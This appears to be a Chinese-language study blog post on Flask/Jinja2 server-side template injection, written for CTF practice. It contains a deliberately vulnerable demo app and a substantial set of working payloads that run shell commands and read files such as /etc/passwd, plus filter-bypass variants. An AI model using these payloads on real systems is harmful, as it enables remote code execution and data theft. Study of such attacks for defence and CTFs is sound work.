+++
title = 'SSTI 漏洞'
date = 2024-09-21T19:17:14+08:00
draft = false
categories = ['CS', 'sec']
+++

SSTI  （Server-Side Template Injection）服务器端模板注入

特征：
- 网站能够返回用户的自定义内容，并以一种“模板”的形式
- `{}`

---
## 背景

模板的诞生是为了将显示与数据分离，模板技术多种多样，但其本质是将模板文件和数据通过模板引擎生成最终的HTML代码。
- 通俗理解：拿到数据，塞到模板里，然后让渲染引擎将赛进去的东西生成 html 的文本，返回给浏览器，这样做的好处展示数据快，大大提升效率。

常见模板有：
- python框架 jinja2 mako tornado django
- PHP框架 smarty twig
- java框架 jade velocity

这些框架使用渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞。

---
## flask 基础

- 常见的基于Python的模板

### 实例：最小的 flask

```python
from flask import Flask
# 导入Flask类.用于后面实例化出一个WSGI应用程序.
app = Flask(__name__)

# 创建Flask实例,传入的第一个参数为模块或包名.
@app.route('/')

# route 装饰器的作用是将函数与url绑定起来，即把 helloworld 这个函数与根目录绑定
# 使用 route() 装饰器告诉 Flask 什么样的 URL 能触发我们的函数

def hello_world():  # put application's code here
    return 'Hello World!'

if __name__ == '__main__':
    app.run()
# app.run()函数让应用在本地启动
```
- route 装饰器的作用是将函数与url绑定起来

python3执行：
```shell
python3 hello.py         
 * Serving Flask app 'hello'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on http://127.0.0.1:5000
Press CTRL+C to quit
```


### 渲染方法

flask的渲染方法有 `render_template` 和 `render_template_string` 两种。

`render_template()` 是用来渲染一个指定的文件的：

```python
return render_template('index.html')
```

`render_template_string` 则是用来渲染一个字符串的，SSTI与这个方法密不可分。


```python
html = '<h1>This is index page</h1>'
return render_template_string(html)
```


### route 装饰器路由

使用route()装饰器告诉Flask什么样的URL能触发我们的函数。
```python
@app.route('/')
```

.route()装饰器把一个函数绑定到对应的URL上，这句话相当于路由，一个路由跟随一个函数。
```python
@app.route('/')
def test():
   return 123
```


此外还可以设置动态网址
```python
@app.route("/hello/<username>")
def hello_user(username):
  return "user:%s"%username
```

![[../../../../img/Pasted image 20240716152629.png|300]]


### 重点：模板渲染

Flask的模板引擎是`jinja2`，文档可以参考这个  
- [https://svn.python.org/projects/external/Jinja-2.1.1](https://svn.python.org/projects/external/Jinja-2.1.1/docs/_build/html/api.html#basics)  

在网站的根目录下新建`templates`文件夹，用来存放模板文件。

```html
<html>
  <head>
    <title>SSTI</title>
  </head>
 <body>
      <h3>Hello, {{name}}</h3>
  </body>
</html>
```
- 模板文件使用 HTML 的语法，但并不是单纯的 HTML 代码，代码中==夹杂着模板的语法==
- `{{}}` 就是模板的语法，表示其中是需要渲染的内容
- 在Jinja2 ，用`{{}}` 作为变量包裹标识符，用`{% ... %}`表示指令
- Jinja2 主要是 ==Python2== 的环境


此时我们写我们的模板渲染代码(app.py)，内容如下：
```python
from flask import Flask, request, render_template

app = Flask(__name__)

@app.route('/',methods=['GET'])
def hello_world():
    query = request.args.get('name') # GET取参数name的值
    return render_template('test.html', name=query) # 将name的值传入模板,进行渲染

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=30000, debug=True)
  # 让操作系统监听所有公网 IP,此时便可以在公网上看到自己的web，同时开启debug，方便调试。
```


文件结构：
![](../../../../img/Pasted%20image%2020240921192250.png)


测试结果：
![](../../../../img/Pasted%20image%2020240921192254.png)

---
## python 魔术方法

在Python的SSTI中，大部分是依靠 ==基类->子类->危险函数== 的方式来利用SSTI

```c
__class__  万物皆对象，class用于返回该对象所属的类，比如某个字符串，他的对象为字符串对象，而其所属的类为<class 'str'>

__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。

__base__   以字符串返回一个类所直接继承的类。

__bases__  以元组的形式返回一个类所直接继承的类。
// __base__和__mro__都是用来寻找基类的

__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表，获取类的所有子类。

__init__  类的初始化方法，所有自带带类都包含init方法，便于利用他当跳板来调用globals。

__globals__  函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价
```

#### 实例

![](../../../../img/Pasted%20image%2020240924101851.png)

```python
# 寻找可用引用（子类）
>>> ''.__class__.__mro__[2].__subclasses__() 
>>> [<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, <type 'complex'>, <type 'float'>, <type 'buffer'>, <type 'long'>, <type 'frozenset'>, <type 'property'>, <type 'memoryview'>, <type 'tuple'>, <type 'enumerate'>, <type 'reversed'>, <type 'code'>, <type 'frame'>, <type 'builtin_function_or_method'>, <type 'instancemethod'>, <type 'function'>, <type 'classobj'>, <type 'dictproxy'>, <type 'generator'>, <type 'getset_descriptor'>, <type 'wrapper_descriptor'>, <type 'instance'>, <type 'ellipsis'>, <type 'member_descriptor'>, <type 'file'>, <type 'PyCapsule'>, <type 'cell'>, <type 'callable-iterator'>, <type 'iterator'>, <type 'sys.long_info'>, <type 'sys.float_info'>, <type 'EncodingMap'>, <type 'fieldnameiterator'>, <type 'formatteriterator'>, <type 'sys.version_info'>, <type 'sys.flags'>, <type 'exceptions.BaseException'>, <type 'module'>, <type 'imp.NullImporter'>, <type 'zipimport.zipimporter'>, <type 'posix.stat_result'>, <type 'posix.statvfs_result'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class '_abcoll.Hashable'>, <type 'classmethod'>, <class '_abcoll.Iterable'>, <class '_abcoll.Sized'>, <class '_abcoll.Container'>, <class '_abcoll.Callable'>, <type 'dict_keys'>, <type 'dict_items'>, <type 'dict_values'>, <class 'site._Printer'>, <class 'site._Helper'>, <type '_sre.SRE_Pattern'>, <type '_sre.SRE_Match'>, <type '_sre.SRE_Scanner'>, <class 'site.Quitter'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>] 

# 可以看到有一个`<type 'file'>`
# payload:
# ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()
```



---

## 直接的 XSS 注入

ssti.py
```python
from flask import Flask, request, render_template_string
app = Flask(__name__)

@app.route('/test/')
def test():
    code = request.args.get('id')
    html = '''
        <h3>%s</h3>
    ''' % (code)
    return render_template_string(html)

# run the app in localhost
if __name__ == '__main__':
    app.run()
```
- 直接 python3 运行这个文件即可

正常使用：
![](../../../../img/Pasted%20image%2020240921194704.png)


==注入==：
![](../../../../img/Pasted%20image%2020240921194643.png)

修改代码以避免直接的 XSS 注入：
```python
@app.route('/test/')
def test():
    code = request.args.get('id')
    return render_template_string('<h1>{{ code }}</h1>',code=code)
```
- 用 `{{}}` 传递变量，**模板引擎**会对渲染的变量进行编码转义，所以不会执行恶意脚本，仅回显脚本内容

---

## 模板注入

- 文件读取/命令执行

`{{}}`并不仅仅可以传递变量，还可以执行一些简单的表达式。

以上一个 part 的 ssti.py 代码为例，注入 `id={{2*4}}`  :
![](../../../../img/Pasted%20image%2020240924100108.png)
`
一般思路：找到父类`<type 'object'>`-->寻找子类-->找关于命令执行或者文件操作的模块

### 手工 payload
```c
# 先 {{''.__class__.__mro__[1].__subclasses__()}} 找子类

# index 函数返回子类的索引
{{''.__class__.__mro__[2].__subclasses__().index('file')}}

[].__class__.__base__.__subclasses__()[59].__init__.__globals__.keys().index('linecache')  

# classified by subclasses

# class warnings.catch_warnings -> linecache -> os
{{[].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys()}}
{{[].__class__.__base__.__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls").read()')}}
# rce's result could be returned by curling 

# class site._Printer
{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].listdir('.')}}

# type 'file'
{{''.__class__.__mro__[1].__subclasses__()[xx]('/etc/passwd').read()}}

# WarningMessage -> builtins -> file
{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('F://GetFlag.txt').read()}}

# WarningMessage -> builtins -> eval
{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("whoami").read()')}}

# class 'os._wrap_close' -> builtins -> chr  用于绕过
{% set chr= ''['_''_cl''ass_''_']['_''_ba''se_''_']['_''_subcla''sses_''_']()[137]['_''_in''it_''_']['_''_glo''bals_''_']['_''_bui''ltins_''_']['chr']%}

{% set cmd='cat '~chr(47)~'flag' %}

# class 'os._wrap_close' -> popen
{%print(''['_''_cl''ass_''_']['_''_ba''se_''_']['_''_subcla''sses_''_']()[137]['_''_in''it_''_']['_''_glo''bals_''_']['po''pen']('pwd')['rea''d']())%}


```


- 比如 `[xx]` 表示 `__subclasses__` 的第xx+1个
- 一般先扫目录找 flag 位置，再读 flag 文件


更自动的payload：
```bash
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cd ..;ls;cat flag').read()")}}{% endif %}{% endfor %}

{{ config.__class__.__init__.__globals__['os'].popen('cat /flag | base64').read()}}

# rce
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}{% endif %}{% endfor %}

# readfile
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read()}}{% endif %}{% endfor %}

```

---
## 绕过

### `{{}}` 过滤

{%print 123%}` 绕过 `{}


### `.` 过滤

使用 JinJa2 函数`|attr()`  
- 将`request.__class__`改成`request|attr("__class__")`


`['']` 绕过`.` 

```
{{"".__class__}}  =  {{""['__class']}}
```


### `[]` 过滤

pop 函数

```
''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()
```


### `"` 过滤

`request.args` 是flask中的一个属性，用 GET path 参数传递路径

```
{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()}}&path=/etc/passwd
```

`request.args`改为`request.values`则利用post的方式进行传参

```
GET:  
{{ ''[request.value.class][request.value.mro][2][request.value.subclasses]()[40]('/etc/passwd').read() }}  
POST:  
class=__class__&mro=__mro__&subclasses=__subclasses__
```


### 关键字过滤

`__getattribute__` base64 编码

```
{{[].__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40]("/etc/passwd").read()}}
```

字符串拼接

```
{{[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40]("/etc/passwd").read()}}
```


关键字中插入一对单引号 `''`，绕过对关键字的黑名单过滤

```Go
BaseCTF{%print(''['_''_cl''ass_''_']['_''_ba''se_''_']['_''_subcla''sses_''_']()[137])%}
```


### `/` 过滤

builtins 的 chr 函数
- chr(47) 表示 `/`

```
{% set chr= ''['_''_cl''ass_''_']['_''_ba''se_''_']['_''_subcla''sses_''_']()[137]['_''_in''it_''_']['_''_glo''bals_''_']['_''_bui''ltins_''_']['chr']%}

{% set cmd='cat '~chr(47)~'flag' %}

{%print(''['_''_cl''ass_''_']['_''_ba''se_''_']['_''_subcla''sses_''_']()[137]['_''_in''it_''_']['_''_glo''bals_''_']['po''pen'](cmd)['rea''d']())%}
```


---
## 参考

- 很清晰且基础的讲解： [从零学习flask模板注入 - FreeBuf网络安全行业门户](https://www.freebuf.com/column/187845.html)
- 一些例题： [CTF-SSTI | Extraderの博客](https://www.extrader.top/posts/47d18edd/)